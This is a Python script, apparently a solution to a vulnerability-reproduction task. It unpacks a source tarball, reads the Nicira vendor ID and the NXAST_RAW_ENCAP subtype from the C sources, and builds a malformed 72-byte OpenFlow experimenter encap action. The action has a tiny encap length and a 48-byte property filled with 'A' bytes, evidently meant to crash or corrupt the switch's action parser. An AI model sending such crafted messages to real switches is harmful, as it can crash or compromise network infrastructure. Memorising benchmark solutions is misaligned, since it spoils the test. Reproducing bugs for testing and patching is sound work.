import os, re, struct, tarfile, tempfile, fnmatch

class Solution:
    def solve(self, src_path: str) -> bytes:
        tmp = tempfile.mkdtemp()
        try:
            with tarfile.open(src_path, 'r:*') as t:
                t.extractall(tmp)
        except Exception:
            pass

        subtype = None
        vendor_id = None

        for root, _, files in os.walk(tmp):
            for fname in files:
                if not fname.endswith(('.c', '.h')):
                    continue
                path = os.path.join(root, fname)
                try:
                    text = open(path, 'r', errors='ignore').read()
                except Exception:
                    continue
                if subtype is None:
                    m = re.search(r'\bNXAST_RAW_ENCAP\b\s*(?:=\s*|\s+)(0x[0-9A-Fa-f]+|\d+)', text)
                    if m:
                        try:
                            subtype = int(m.group(1), 0)
                        except Exception:
                            pass
                if vendor_id is None:
                    m = re.search(r'\bNX_VENDOR_ID\b\s*(?:=| )\s*(0x[0-9A-Fa-f]+|\d+)', text)
                    if m:
                        try:
                            vendor_id = int(m.group(1), 0)
                        except Exception:
                            pass
                if subtype is not None and vendor_id is not None:
                    break
            if subtype is not None and vendor_id is not None:
                break

        if subtype is None:
            subtype = 38
        if vendor_id is None:
            vendor_id = 0x2320

        total_len = 72
        prop_len = 48  # property length including header

        buf = bytearray(total_len)
        off = 0
        struct.pack_into('!H', buf, off, 0xFFFF)        # OFPAT_EXPERIMENTER
        off += 2
        struct.pack_into('!H', buf, off, total_len)     # length
        off += 2
        struct.pack_into('!I', buf, off, vendor_id)     # vendor
        off += 4
        struct.pack_into('!H', buf, off, subtype)       # subtype
        off += 2
        off += 6                                         # pad
        struct.pack_into('!H', buf, off, 1)             # encap_len (small)
        off += 2
        off += 6                                         # pad
        struct.pack_into('!H', buf, off, 1)             # property type
        off += 2
        struct.pack_into('!H', buf, off, prop_len)      # property length
        off += 2
        buf[off:off+44] = b'A' * 44                     # property data

        return bytes(buf)
